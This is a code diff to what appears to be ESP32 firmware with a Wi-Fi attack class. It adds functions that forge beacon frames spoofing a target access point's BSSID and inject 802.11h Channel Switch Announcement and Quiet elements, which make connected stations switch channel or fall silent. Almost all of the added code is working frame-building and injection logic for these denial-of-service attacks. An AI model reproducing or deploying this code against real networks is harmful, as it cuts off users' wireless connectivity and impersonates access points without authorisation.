@@ -121,6 +121,96 @@ esp_err_t WifiAttackUtil::beaconSpam(const char* ssid, const uint8_t channel, co
   return ESP_OK;
 }
 
+// Shared beacon scaffold for the 802.11h element attacks: MAC header spoofing
+// `bssid`, fixed params, SSID / Rates / DS IEs. Returns bytes written and the
+// sequence-control offset (patched per send). The caller appends its element.
+static size_t _buildBeaconPrefix(uint8_t* pkt, const uint8_t* bssid,
+                                 const char* ssid, size_t ssidLen,
+                                 uint8_t channel, size_t& seqOff)
+{
+  size_t n = 0;
+  pkt[n++] = 0x80; pkt[n++] = 0x00;                    // Frame Control: beacon
+  pkt[n++] = 0x00; pkt[n++] = 0x00;                    // Duration
+  pkt[n++] = 0xFF; pkt[n++] = 0xFF; pkt[n++] = 0xFF;
+  pkt[n++] = 0xFF; pkt[n++] = 0xFF; pkt[n++] = 0xFF;   // DA: broadcast
+  memcpy(&pkt[n], bssid, 6); n += 6;                    // SA = target BSSID
+  memcpy(&pkt[n], bssid, 6); n += 6;                    // BSSID = target BSSID
+  seqOff = n;
+  pkt[n++] = 0x00; pkt[n++] = 0x00;                    // Sequence Control (per send)
+
+  memset(&pkt[n], 0, 8); n += 8;                        // Timestamp
+  pkt[n++] = 0xE8; pkt[n++] = 0x03;                    // Beacon interval
+  pkt[n++] = 0x31; pkt[n++] = 0x00;                    // Capability (privacy like a real AP)
+
+  pkt[n++] = 0x00; pkt[n++] = (uint8_t)ssidLen;        // SSID IE
+  memcpy(&pkt[n], ssid, ssidLen); n += ssidLen;
+
+  pkt[n++] = 0x01; pkt[n++] = 0x08;                    // Supported Rates IE
+  pkt[n++] = 0x82; pkt[n++] = 0x84; pkt[n++] = 0x8B; pkt[n++] = 0x96;
+  pkt[n++] = 0x24; pkt[n++] = 0x30; pkt[n++] = 0x48; pkt[n++] = 0x6C;
+
+  pkt[n++] = 0x03; pkt[n++] = 0x01; pkt[n++] = channel; // DS Parameter Set IE
+  return n;
+}
+
+esp_err_t WifiAttackUtil::channelSwitch(const MacAddr bssid, const char* ssid,
+                                        const uint8_t channel, const uint8_t newChannel,
+                                        const uint8_t switchCount)
+{
+  esp_err_t res = _changeChannel(channel);
+  if (res != ESP_OK) return res;
+
+  const size_t ssidLen = strnlen(ssid, 32);
+  uint8_t pkt[128];
+  size_t  seqOff = 0;
+  size_t  n = _buildBeaconPrefix(pkt, bssid, ssid, ssidLen, channel, seqOff);
+
+  // Channel Switch Announcement IE (element 37): mode, new channel, count.
+  // mode = 1 → stations stop transmitting until the switch completes.
+  pkt[n++] = 0x25; pkt[n++] = 0x03;
+  pkt[n++] = 0x01; pkt[n++] = newChannel; pkt[n++] = switchCount;
+
+  for (int k = 0; k < 3; k++) {
+    uint16_t sc = (uint16_t)((_sequenceNumber & 0x0FFF) << 4);
+    pkt[seqOff]     = (uint8_t)(sc & 0xFF);
+    pkt[seqOff + 1] = (uint8_t)(sc >> 8);
+    _sequenceNumber++;
+    _sendPacket(pkt, n);
+    vTaskDelay(1 / portTICK_RATE_MS);
+  }
+  return ESP_OK;
+}
+
+esp_err_t WifiAttackUtil::quiet(const MacAddr bssid, const char* ssid,
+                                const uint8_t channel, const uint8_t count,
+                                const uint8_t period, const uint16_t duration,
+                                const uint16_t offset)
+{
+  esp_err_t res = _changeChannel(channel);
+  if (res != ESP_OK) return res;
+
+  const size_t ssidLen = strnlen(ssid, 32);
+  uint8_t pkt[128];
+  size_t  seqOff = 0;
+  size_t  n = _buildBeaconPrefix(pkt, bssid, ssid, ssidLen, channel, seqOff);
+
+  // Quiet IE (element 40): count, period, duration (TU, LE), offset (TU, LE).
+  pkt[n++] = 0x28; pkt[n++] = 0x06;
+  pkt[n++] = count; pkt[n++] = period;
+  pkt[n++] = (uint8_t)(duration & 0xFF); pkt[n++] = (uint8_t)(duration >> 8);
+  pkt[n++] = (uint8_t)(offset & 0xFF);   pkt[n++] = (uint8_t)(offset >> 8);
+
+  for (int k = 0; k < 3; k++) {
+    uint16_t sc = (uint16_t)((_sequenceNumber & 0x0FFF) << 4);
+    pkt[seqOff]     = (uint8_t)(sc & 0xFF);
+    pkt[seqOff + 1] = (uint8_t)(sc >> 8);
+    _sequenceNumber++;
+    _sendPacket(pkt, n);
+    vTaskDelay(1 / portTICK_RATE_MS);
+  }
+  return ESP_OK;
+}
+
 esp_err_t WifiAttackUtil::beaconFlood(const uint8_t* bssid, const char* ssid, const uint8_t channel)
 {
   esp_err_t res = _changeChannel(channel);
